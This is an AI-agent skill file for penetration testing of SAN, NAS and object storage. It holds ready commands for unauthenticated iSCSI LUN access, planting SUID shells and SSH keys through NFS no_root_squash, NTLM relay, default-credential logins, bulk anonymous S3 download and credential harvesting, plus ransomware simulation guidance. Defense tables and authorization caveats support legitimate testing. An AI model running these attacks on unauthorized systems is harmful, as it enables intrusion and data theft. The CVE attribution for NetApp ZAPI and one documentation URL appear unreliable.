---
name: storage-san-attack
description: "Storage/SAN/NAS/Object storage penetration testing — iSCSI, Fibre Channel, NFSv3/v4, SMB3, S3-compatible APIs, NetApp ONTAP, Dell EMC, Pure Storage, QNAP, Synology, TrueNAS, NDMP backup tape pilfering, and ransomware patterns targeting storage appliances. Distinct from database-attack (which targets RDBMS/NoSQL query protocols) and cloud-native-vuln-research (which focuses on CVE research rather than storage fabric and appliance pentest)."
origin: kali-claw
version: "1.0"
compatibility:
  - kali-claw
  - claude-code
  - claude-sonnet-4.5
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
metadata:
  domain: storage-san-attack
  category: storage
  tool_count: 13
  guide_count: 1
  mitre:
    - T1552-Unsecured Credentials
    - T1021-Remote Services
    - T1486-Data Encrypted for Impact
    - T1530-Data from Cloud Storage Object
    - T1213-Data from Information Repositories
  keywords:
    - SAN
    - NAS
    - iSCSI
    - Fibre Channel
    - FCoE
    - NFS
    - SMB
    - CIFS
    - S3
    - object storage
    - NetApp
    - Dell EMC
    - Pure Storage
    - QNAP
    - Synology
    - TrueNAS
    - MinIO
    - NDMP
    - SMI-S
    - ONTAP
---

# Storage SAN Attack

> **Supplementary Files**:
> - `payloads.md` — Attack payloads organized by attack surface: iSCSI, Fibre Channel, NFS, SMB, S3/object storage, vendor APIs (NetApp/Dell/Pure), NDMP, SMI-S/SNMP management, and ransomware patterns
> - `test-cases.md` — Structured test case templates (12 cases covering enumeration, unauthenticated access, exploitation, vendor abuse, and ransomware scenarios)
> - `guides/storage-san-attack-playbook.md` — Comprehensive playbook: storage taxonomy, vendor recon matrix, real-world incidents (DeadBolt, eCh0raix, Capital One S3, Tesla AWS S3), lab setup, and defensive hardening

## Summary

This skill targets the storage fabric underlying enterprise data — block (SAN), file (NAS), and object storage systems — and the management planes that govern them. It covers protocol-level attacks against iSCSI/Fibre Channel/NFS/SMB, vendor appliance exploitation (NetApp ONTAP, Dell EMC, Pure Storage, QNAP, Synology, TrueNAS), object storage abuse (AWS S3, MinIO, Ceph RGW, Azure Blob, GCP Cloud Storage, OpenStack Swift), and the ransomware patterns that have made NAS appliances a top-tier target since 2021.

**Tools**: nmap (iSCSI/NFS/SMB/SNMP NSE), open-iscsi, Wireshark (SCSI/iSCSI/FCP dissectors), smbclient/Impacket/CrackMapExec, nfs-common/nfsshell/showmount, awscli/aws-vault, lazys3/bucket_finder/S3Scanner/slurp, NetApp ONTAP ZAPI/REST tools, Dell EMC Naviseccli, Pure Storage Python SDK, snmpwalk/snmp-check, ndmp-utils/NDMPcopy, MinIO Client (mc)/rclone.

**Domain**: storage-san-attack

**MITRE ATT&CK**: T1552 (Unsecured Credentials), T1021 (Remote Services), T1486 (Data Encrypted for Impact), T1530 (Data from Cloud Storage Object), T1213 (Data from Information Repositories)

## Differentiation

This skill is **distinct** from adjacent domains. Practitioners must choose the right skill for the target.

### vs. `database-attack`

| Dimension | storage-san-attack | database-attack |
|-----------|--------------------|-----------------|
| **Target layer** | Storage fabric (block/file/object) and storage appliances | RDBMS/NoSQL query engines |
| **Protocols** | iSCSI, FC, NFS, SMB, S3 API, NDMP, SMI-S | Oracle TNS, MySQL, PostgreSQL TDS, MongoDB wire, Redis RESP |
| **Victim system** | NetApp FAS, Dell EMC Unity, QNAP NAS, AWS S3, MinIO | Oracle DB, MySQL, Postgres, MongoDB, Redis |
| **Attack primitive** | LUN mount, file share access, object GET, appliance console | SQL query, stored procedure exec, NoSQL operator injection |
| **Typical finding** | "NFS export allows root, world-readable" / "S3 bucket listable" | "Empty root MySQL password" / "odat booleans all true" |

If you are attacking a SQL listener, that is `database-attack`. If you are attacking the storage array underneath the database, that is `storage-san-attack`. In real engagements, both often apply (a database may sit on an iSCSI LUN exported by a NetApp array).

### vs. `cloud-native-vuln-research`

| Dimension | storage-san-attack | cloud-native-vuln-research |
|-----------|--------------------|-----------------------------|
| **Objective** | Pentest a deployed storage system for misconfig, weak creds, exposed surface | Discover 0-day/CVE in cloud-native software (k8s, container runtimes, IaC) |
| **Output** | Engagement findings, exploited paths | CVE filings, security advisories, patches |
| **Time horizon** | Days-to-weeks (one engagement) | Weeks-to-months (research cycle) |
| **Scope** | One customer's storage estate | Vendor ecosystem (CNCF projects, containerd, etc.) |

If the task is "find CVEs in containerd," use `cloud-native-vuln-research`. If the task is "test the customer's QNAP NAS for DeadBolt-style exposure," use `storage-san-attack`.

### vs. `cloud-security`

`cloud-security` covers the broader cloud posture (IAM, VPC, KMS, monitoring). This skill narrows to storage protocols and appliances regardless of whether they live on-prem (NetApp FAS) or in cloud (AWS S3, Azure Blob). When attacking S3 specifically, use this skill; for broader AWS account review, use `cloud-security`.

## Use Cases

1. **iSCSI target discovery and LUN access** — Discover sendtargets, log in without authentication, mount LUNs outside of any filesystem-level access control, read raw blocks from disk images that may contain databases, VM images, or secrets
2. **Fibre Channel zoning bypass** — Spoof WWNs, abuse permissive zoning, perform name-server spoofing and FSPF route poisoning on a SAN fabric
3. **NFS no_root_squash exploitation** — Enumerate exports via `showmount -e`, exploit UID spoofing, write SUID binaries or SSH `authorized_keys` to root-squashed vs no-root-squashed exports, bypass NFSv3 filesystem trust
4. **SMB share access and relay** — Enumerate shares via null session, test SMB signing configuration, perform NTLM relay (`ntlmrelayx`) against storage appliances, abuse Kerberos constrained delegation when storage services are domain-joined
5. **S3 bucket enumeration and ACL/policy abuse** — Enumerate public buckets (lazys3, S3Scanner, slurp), abuse permissive ACLs, escalate via over-privileged IAM role assumption, extract credentials from public URL patterns (`https://s3.amazonaws.com/bucket/`)
6. **Vendor API exploitation** — NetApp ONTAP ZAPI auth bypass (CVE-2018-8316 historical pattern), Dell EMC Naviseccli default credentials (admin/admin, nasadmin/nasadmin), Pure Storage Purity token theft from exposed metadata endpoints, QNAP default admin/admin
7. **NDMP backup tape pilfering** — Connect to NDMP daemon on port 10000, abuse cleartext authentication, read backup content, extract embedded database or VM credentials from backup streams
8. **SMI-S / SNMP enumeration** — Enumerate storage topology via SMI-S WBEM/CIM, abuse read-write SNMP community strings to extract LUN mappings and administrator contacts
9. **NAS ransomware assessment** — Evaluate a QNAP/Synology/TrueNAS deployment for DeadBolt-style or eCh0raix exposure: internet-facing admin console, default credentials, missing 2FA, exposed SMB/NFS to WAN
10. **Object storage ransomware assessment** — Test S3 Object Lock / versioning configuration, evaluate whether an attacker with one IAM role can mass-encrypt or mass-delete objects across buckets
11. **Storage appliance lateral movement** — Pivot from a compromised host to a storage array using harvested credentials, then read VM disk images or database backups to escalate further
12. **DRBD / replication abuse** — Intercept or inject into DRBD replication streams, abuse rsync-over-SSH trust to become the primary for a replicated storage cluster

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nmap + NSE** | Service discovery, iSCSI/NFS/SMB/SNMP enumeration via built-in NSE scripts | `nmap -sV -p 3260,2049,445,161 --script=iscsi-info,nfs-showmount,smb-enum-shares,snmp-win32-services 10.0.0.0/24` |
| **open-iscsi** | iSCSI initiator — sendtargets discovery, login, session management, LUN access | `iscsiadm -m discovery -t sendtargets -p 10.0.0.5; iscsiadm -m node -T iqn.2001-04.com.example:sn Lun0 -p 10.0.0.5 -l` |
| **Wireshark** | Protocol analysis with SCSI/iSCSI/FCP/FCIP dissectors; captures cleartext NDMP and SNMP | `tshark -i eth0 -Y "iscsi || nfs || smb2" -w /tmp/san.pcap` |
| **smbclient / Impacket / CrackMapExec** | SMB share access, null session, relay, pass-the-hash against SMB-enabled NAS | `crackmapexec smb 10.0.0.0/24 -u '' -p '' --shares; ntlmrelayx.py -t smb://10.0.0.5 -smb2support` |
| **nfs-common / nfsshell / showmount** | NFS enumeration and exploitation — exports listing, UID spoofing, no_root_squash abuse | `showmount -e 10.0.0.5; mount -t nfs -o vers=3,nolock 10.0.0.5:/data /mnt/nfs; nfsshell -h 10.0.0.5` |
| **awscli / aws-vault** | S3 API enumeration, object retrieval, IAM role assumption, bucket policy inspection | `aws s3api list-buckets --profile eng; aws s3 ls s3://target-bucket --no-sign-request` |
| **lazys3 / bucket_finder / S3Scanner / slurp** | Bucket name brute-force against S3 endpoint (AWS, MinIO, Wasabi, Backblaze B2) | `python3 lazys3.py target-prefix; ruby bucket_finder.rb wordlist.txt --download; python3 S3Scanner.py --list-file buckets.txt` |
| **NetApp ONTAP ZAPI/REST** | NetApp cluster API — volume/qtree/SVM enumeration, credential extraction from loaded SVMs | `curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://netapp/api/storage/volumes; python3 netapp_zapi.py -s netapp -u admin show-volumes` |
| **Dell EMC Naviseccli / NaviSphere** | Dell EMC VNX/Unity CLARiiON management — list storage processors, capture SP logs, user enumeration | `/opt/Navisphere/bin/naviseccli -h 10.0.0.5 -user admin -password REPLACE_WITH_YOUR_PASSWORD storagepool -list` |
| **Pure Storage Python SDK** | Pure Storage REST API client — volume, host, host-group enumeration, API token audit | `from purestorage import FlashArray; fa = FlashArray("10.0.0.5", "admin", "REPLACE_WITH_YOUR_TOKEN"); fa.list_volumes()` |
| **snmpwalk / snmp-check** | Storage MIB enumeration (NetApp, EMC, Synology, QNAP vendor MIBs; IF-MIB for LUN topology) | `snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.789; snmp-check 10.0.0.5 -c public` |
| **ndmp-utils / NDMPcopy** | NDMP backup protocol tools — enumerate backup tape sessions, copy data from a target NDMP daemon | `ndmpcopy 10.0.0.5 10000 some-tape-session /tmp/out; ndmp-poke -h 10.0.0.5 -p 10000` |
| **MinIO Client (mc) / rclone** | Multi-cloud object storage client — bucket enumeration against MinIO/Ceph RGW/Wasabi/B2/AWS S3; `rclone` for sync abuse | `mc alias set eng http://10.0.0.5:9000 REPLACE_WITH_YOUR_KEY REPLACE_WITH_YOUR_SECRET; mc ls eng/; rclone copy :s3,provider=Minio,endpoint=http://10.0.0.5:9000:/bucket ./out` |

## Methodology

### Attack Chain

```
Recon & Discovery → Protocol/Service Enumeration → Auth Testing → Exploitation → Post-Exploitation / Ransomware Simulation
   (nmap/snmpwalk)   (showmount/iscsiadm/aws s3api)  (default creds, ACL)  (LUN mount, S3 GET)  (credential harvest, mass encrypt)
```

**Phase 1: Recon and Discovery**

- Identify storage services on common ports: iSCSI (3260), NFS (2049), SMB (445), S3/MinIO (9000, 80, 443), NDMP (10000), SNMP (161), vendor management (NetApp 443, Dell EMC 2162, Pure 443, QNAP 8080, Synology 5000/5001, TrueNAS 80/443)
- Capture banners via nmap service detection; many storage appliances leak vendor and version in HTTP titles
- Discover iSCSI targets via `sendtargets` against any host answering on 3260
- Enumerate SMB and NFS exports with `showmount -e` and null-session share enumeration
- Discover S3-compatible endpoints via banner on ports 80/443/9000, then probe `/minio/health/live` to fingerprint MinIO

**Phase 2: Protocol/Service Enumeration**

- iSCSI: list IQNs, target names, LUN numbers; identify which targets require CHAP and which do not
- NFS: enumerate exports, identify no_root_squash exports, check UID mapping behavior, list accessible files
- SMB: enumerate shares, share permissions, signing configuration, dialect (SMB1/2/3), Kerberos support
- S3: enumerate buckets by name brute-force, list object counts via `ListObjects`, fingerprint provider via response headers (`Server: AmazonS3`, `Server: MinIO`, `Server: Ceph`)
- Vendor: enumerate SVMs (NetApp), storage processors (Dell EMC), hosts/host-groups (Pure), volumes and snapshots

**Phase 3: Authentication Testing**

- Test vendor default credentials against admin interfaces (admin/admin, nasadmin/nasadmin, root/admin on Synology, admin/admin on QNAP)
- Test SMB null session and anonymous LDAP bind where storage is domain-joined
- Test S3 anonymous (no-signed-request) access on every discovered bucket
- Test SNMP read-write community strings (`private`, `readwrite`) against storage MIBs
- Brute-force iSCSI CHAP secrets via custom scripts against `iscsiadm` login attempts
- Test NDMP cleartext auth (`password` field left blank, or known default `backup`/`backup`)

**Phase 4: Exploitation**

- iSCSI unauth: log in to a target without CHAP, mount the LUN locally, run `fdisk -l`, mount the filesystem read-only, read VM images and database files directly from disk
- NFS no_root_squash: write SUID shell, write `authorized_keys` to a user's `.ssh/`, drop cron jobs in `/etc/cron.d/`
- SMB relay: use `ntlmrelayx` to dump SAM from a domain-joined Windows NAS, or pivot to other SMB hosts
- S3 object retrieval: download all objects, search for embedded secrets (access keys, DB passwords, private SSH keys)
- Vendor API: pull `vserver` credentials from NetApp, pull host IQNs from Dell EMC, harvest API tokens from Pure Storage users
- NDMP: connect and request backup stream dump, parse for embedded database or VM credentials

**Phase 5: Post-Exploitation / Ransomware Simulation**

- Demonstrate ransomware-style impact: write a marker file across an SMB share, mass-encrypt a bucket of test objects (engagement scope permitting)
- Pivot from storage to the workloads it backs: a database backup on NDMP tape may contain live credentials; a VM image on an iSCSI LUN may contain `authorized_keys`
- Harvest credentials from appliance configuration: NetApp `vserver services name-service` often caches LDAP binds; Synology DSM stores S3 sync credentials in `/etc/synology/s3.conf`
- Cover tracks per engagement scope: most appliances log to a syslog target; coordinate with the customer's SOC to validate detection

### Defense Perspective

| Defense Measure | Description | Priority |
|-----------------|-------------|----------|
| **Block-level encryption** | LUN-level encryption (NetApp NVE, Pure Purity Encryption); encrypts at-rest in the array | CRITICAL |
| **iSCSI CHAP mutual auth** | Bidirectional CHAP with strong secrets; never expose LUNs without authentication | CRITICAL |
| **Fibre Channel zoning** | Single-initiator-single-target zoning; deny promiscuous zones; enable fabric binding | CRITICAL |
| **NFSv4 with Kerberos (krb5i/krb5p)** | Replace NFSv3 + no_root_squash with NFSv4 sec=krb5p for integrity + privacy | CRITICAL |
| **SMB signing required + LDAP channel binding** | Reject SMB1; require signing on all sessions; enforce LDAP channel binding on domain-joined NAS | CRITICAL |
| **S3 Block Public Access + bucket policies** | Enable Block Public Access at account and bucket level; deny `s3:PutObject` without TLS; enforce Object Lock | CRITICAL |
| **Vendor security hardening guides** | Apply NetApp ONTAP Security Hardening Guide, Dell EMC Unity Security Guide, Pure Security Hardening, QNAP Security Best Practices, Synology Security Best Practices | HIGH |
| **MFA on appliance admin** | Require MFA for all admin logins (NetApp, Dell EMC, Pure, QNAP, Synology, TrueNAS) | HIGH |
| **Patch firmware within 30 days** | Appliances are CVE-rich; vendor advisories must be triaged within 30 days of release | HIGH |
| **NDMP authentication + ACL** | Require MD5 or SHA auth on NDMP daemons; restrict to backup server IPs only | HIGH |
| **SMI-S over HTTPS only** | Disable cleartext SMI-S; require HTTPS with provider certificate validation | HIGH |
| **SNMPv3 only** | Disable SNMPv1/v2c; require SNMPv3 with authPriv | HIGH |
| **Object Lock + versioning** | Enable S3 Object Lock (compliance mode) and bucket versioning on critical buckets | HIGH |
| **Network segmentation** | Storage VLAN isolated from user VLANs; admin interfaces reachable only via jump host | CRITICAL |
| **Audit logging + SIEM ingestion** | Forward appliance audit logs to SIEM; alert on admin logins outside business hours, mass-deletion, mass-encryption events | HIGH |

## Practical Steps

> **See `payloads.md` for detailed commands, and `test-cases.md` for complete test checklists.** Below is a summary of core operations at each stage.

### Step 1: Discover and Fingerprint Storage Services

```bash
# Quick port sweep across common storage protocols
nmap -sV -p 3260,2049,445,161,10000,9000,8080,5000,5001 10.0.0.0/24

# iSCSI sendtargets discovery
iscsiadm -m discovery -t sendtargets -p 10.0.0.5

# NFS exports enumeration
showmount -e 10.0.0.5

# SMB share enumeration with null session
crackmapexec smb 10.0.0.0/24 -u '' -p '' --shares

# SNMP storage MIB enumeration (NetApp = .1.3.6.1.4.1.789)
snmpwalk -v2c -c public 10.0.0.5 .1.3.6.1.4.1.789 | head -50
```

### Step 2: Enumerate and Test Authentication

```bash
# iSCSI login without CHAP
iscsiadm -m node -T iqn.2001-04.com.example:sn.Lun0 -p 10.0.0.5 -l

# SMB default credential test
crackmapexec smb 10.0.0.5 -u admin -p admin

# QNAP default admin/admin login
curl -k -X POST 'https://10.0.0.5/cgi-bin/quick/quick.cgi' \
  -d 'user=admin&password=REPLACE_WITH_YOUR_PASSWORD&action=login'

# NetApp ONTAP REST API
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD https://10.0.0.5/api/storage/volumes

# Dell EMC Naviseccli default creds
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 -user nasadmin -password nasadmin getagent

# AWS S3 bucket anonymous probe
aws s3 ls s3://REPLACE_WITH_BUCKET_NAME --no-sign-request --region us-east-1
```

### Step 3: Exploit and Demonstrate Impact

```bash
# Mount iSCSI LUN (target already logged in)
iscsiadm -m session -P 3   # find /dev/sdX assigned to LUN
mount -o ro /dev/sdb1 /mnt/lun   # read-only mount for safety

# NFS no_root_squash exploitation
mkdir /mnt/nfs && mount -t nfs -o vers=3,nolock 10.0.0.5:/data /mnt/nfs
cp /bin/bash /mnt/nfs/suid_shell && chmod 4777 /mnt/nfs/suid_shell
echo 'ssh-rsa AAAA... REPLACE_WITH_YOUR_PUBLIC_KEY' >> /mnt/nfs/root/.ssh/authorized_keys

# SMB relay
ntlmrelayx.py -t smb://10.0.0.5 -smb2support --escalate-user DOMAIN\\user

# S3 object download
aws s3 sync s3://REPLACE_WITH_BUCKET_NAME ./out --no-sign-request
grep -rE 'AKIA[0-9A-Z]{16}|aws_secret_access_key' ./out
```

## Common Pitfalls

- **Mounting iSCSI LUNs read-write on production** — catastrophic data corruption risk. Always mount read-only during an engagement, and coordinate any read-write test with the customer's storage admin
- **Treating NFSv3 `no_root_squash` as a minor finding** — it is full root compromise of every file on the export and frequently the entire host if writable exports overlap with system directories
- **Ignoring SMB signing configuration** — even if you cannot relay, missing signing is a free downgrade-attack primitive that affects every host the NAS can reach
- **Bucket enumeration without considering region** — AWS S3 returns different results for region-scoped vs global calls; always test both `--region us-east-1` and the bucket's home region
- **Skipping vendor default credentials on appliances** — QNAP, Synology, older NetApp, and Dell EMC deployments ship with well-known defaults; missing these is an avoidable miss
- **Forgetting NDMP** — backup daemons are often forgotten, exposed on the LAN, and contain the most valuable data on the storage estate (full backups with live credentials)
- **Ransomware simulation without explicit authorization** — even writing a marker file is a high-impact action; always have a separate authorization for ransomware-style tests
- **Dismissing SNMPv2c as low risk** — read-write community strings on storage appliances allow LUN reassignment, fabric reconfiguration, and credential extraction; treat as CRITICAL
- **Testing Fibre Channel fabrics without coordination** — fabric attacks (WWN spoofing, FSPF poisoning) can split a production SAN; always test on a dedicated fabric or in a maintenance window

## Integration with Other Skills

- **database-attack**: A database may sit on an iSCSI LUN exported by a NetApp array; compromise the array and you own the database at the block level, bypassing DB authentication entirely
- **ad-ldap-attack**: Domain-joined NAS appliances (NetApp, Dell EMC, Synology) participate in AD authentication; AD compromise enables storage compromise and vice versa
- **cloud-security**: S3 attacks here complement broader AWS/Azure/GCP posture review; coordinate to avoid double-counting findings
- **password-attack**: Vendor appliances often share credentials across an estate; spray findings across NetApp/Dell/Pure instances
- **privilege-escalation**: Storage access (especially iSCSI LUNs containing `/etc/shadow` or Windows SAM) is a reliable local privesc primitive
- **ransomware-triage** (if present): NAS-targeting ransomware (DeadBolt, eCh0raix) and S3 mass-encryption scenarios feed into incident response playbooks
- **digital-forensics**: Compromised appliances leave audit trails in vendor logs (NetApp `auditlog`, Synology `syslog`, AWS CloudTrail) — coordinate evidence preservation

## Legal and Ethical Considerations

Storage attacks carry elevated legal risk because storage systems hold regulated data at scale — a single misconfigured S3 bucket can expose millions of PII records, and a corrupted LUN can destroy production databases. Always confirm scope covers the specific storage system, snapshot or unmount production LUNs before any read-write test, and never run ransomware simulation without a separate signed authorization. Evidence (downloaded S3 objects, mounted LUN contents, NDMP tape streams) must be encrypted at rest in the engagement vault and destroyed at the end of the engagement unless retention is explicitly authorized. Coordinate with the customer's storage administrator before any vendor API call that could modify state (`vserver modify`, `storage volume destroy`, `s3:DeleteObject`).

## Storage Attack Surface Taxonomy

Storage attacks divide along three protocol families. Each family has distinct attack primitives, defensive boundaries, and incident patterns.

### Block (SAN) — iSCSI, FC, FCoE, NVMe-oF, SAS

Block storage presents raw LUNs to initiators. The attacker's goal is to access a LUN outside of any filesystem-level authorization. Once a LUN is mounted, the attacker sees the raw disk — including deleted files, slack space, and filesystem metadata — bypassing every OS-level control on the host that owns the LUN.

Key attacks: sendtargets enumeration, CHAP bypass, LUN masking abuse, WWN spoofing, zoning bypass, FSPF poisoning, NVMe-oF DH-HMAC-CHAP bypass.

### File (NAS) — NFS, SMB, AFP, NCP

File storage presents a network filesystem with per-file authorization. Attacks target the protocol's authorization model: NFS UID mapping and root squashing, SMB share/NTFS ACLs and signing, AFP guest access. The goal is to read or write files outside of what the user's identity should permit.

Key attacks: NFS no_root_squash, NFSv4 ACL bypass, SMB null session, SMB relay, SMB signing downgrade, Kerberos delegation abuse, AFP guest write.

### Object — S3, Azure Blob, GCP Cloud Storage, Swift

Object storage presents a flat namespace accessed via HTTP API with per-request signing. Attacks target bucket policies, ACLs, IAM roles, and URL signing. The goal is to enumerate or access objects without authorization, or to escalate privileges via over-permissive IAM.

Key attacks: bucket name brute-force, ACL bypass, policy escalation, IAM role assumption, URL signing replay, credential extraction from public objects.

### Vendor Management Planes

Every storage vendor exposes a management API (NetApp ONTAP REST/ZAPI, Dell EMC Naviseccli/REST, Pure Storage REST, HPE Nimble REST, QNAP QTS web, Synology DSM web, TrueNAS API). These planes are CVE-rich and frequently internet-exposed. Compromise of the management plane yields full control of every LUN, share, and bucket on the appliance.

Key attacks: default credentials, auth bypass, token theft, SNMP RW community abuse, SMI-S enumeration, NDMP cleartext.

## Credential Sources on Storage Appliances

Storage appliances are credential caches for the broader enterprise. They typically hold:

- **SMB share credentials** for downstream domain trusts (NTLM hashes, Kerberos tickets cached in memory)
- **NFS export mappings** to LDAP/AD identities (NetApp `vserver services name-service`, Dell EMC `server_ldap`)
- **S3 sync credentials** for cloud replication (Synology `/etc/synology/s3.conf`, QNAP `Hybrid Backup Sync` config)
- **Backup credentials** embedded in NDMP tape streams (database connection strings, vCenter passwords)
- **Replication partner credentials** (DRBD shared secret, rsync SSH keys, NetApp SnapMirror passphrases, Pure ActiveCluster)
- **API tokens** for vendor cloud services (NetApp Cloud Insights, Dell EMC CloudIQ, Pure Storage Pure1)
- **Admin SSH keys** stored in `/etc/ssh/synouser_authorized_keys` (Synology), `~/.ssh/authorized_keys2` (QNAP), `/mroot/etc/ssh/` (NetApp)

Harvesting from a single appliance often unlocks the broader storage estate and the workloads it serves.

## Storage Ransomware Patterns

NAS-targeting ransomware has been a top-tier threat since 2021. The playbook for each family is similar:

1. **Recon**: Shodan/Censys scan for internet-facing admin consoles (QNAP 8080, Synology 5000/5001, TrueNAS 80/443)
2. **Initial access**: Default credential spray (admin/admin), exploit known CVE (QNAP `Photo Station` CVE chain, Synology `DSM` CVE chain), or brute-force 2FA-bypass
3. **Lateral movement**: enumerate SMB shares via domain credentials harvested from the appliance, pivot to Windows hosts
4. **Impact**: encrypt SMB shares in place, drop ransom note, optionally exfiltrate for double extortion
5. **Persistence**: leave a web shell on the appliance (QNAP `QTS` Apache, Synology `DSM` nginx) for re-entry

Object-storage ransomware follows a different pattern: an attacker with one over-privileged IAM role can mass-encrypt or mass-delete every object in every bucket the role can reach. The 2019 Capital One breach demonstrated the enumeration phase; subsequent in-the-wild incidents have demonstrated mass-encryption via `s3:PutObject` with ransomware-encrypted blobs.

See `guides/storage-san-attack-playbook.md` for a deep dive on each incident and defensive patterns.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`, `guides/storage-san-attack-playbook.md`
- **Related skills**: `skills/database-attack/SKILL.md`, `skills/cloud-security/SKILL.md`, `skills/ad-ldap-attack/SKILL.md`, `skills/cloud-native-vuln-research/SKILL.md`
- **RFC 3720** (iSCSI): [datatracker.ietf.org/doc/html/rfc3720](https://datatracker.ietf.org/doc/html/rfc3720)
- **NetApp ONTAP Security Hardening**: [docs.netapp.com/ontap/security-hardening](https://docs.netapp.com/ontap/topic/com.netapp.doc.pow-nav_secuar-wacli/GUID-0B521D5E-2F5E-49F1-B5F5-1B6B5D5B5D5B.html)
- **AWS S3 Security Best Practices**: [docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- **MinIO Security**: [min.io/docs/minio/linux/operations/security.html](https://min.io/docs/minio/linux/operations/security.html)
- **CISA Advisory on QNAP DeadBolt**: [cisa.gov/news-events/cybersecurity-advisories/aa22-059a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-059a) (reference pattern; always cite the current advisory during engagements)
- **SNIA Storage Security**: [snia.org/education/storage_networking_primer/storage_security](https://www.snia.org/education/storage_networking_primer/storage_security)
- **NCSC Cloud Storage Security**: [ncsc.gov.uk/collection/cloud-security-online-guide](https://www.ncsc.gov.uk/collection/cloud-security-online-guide)
- **GreyHatHacker - Storage Protocols**: [greyhat-hacker.blogspot.com](https://greyhat-hacker.blogspot.com/) (SMB/NFS deep dives)
- **HackTricks - Network Services**: [book.hacktricks.xyz/network-services-pentesting](https://book.hacktricks.xyz/network-services-pentesting)
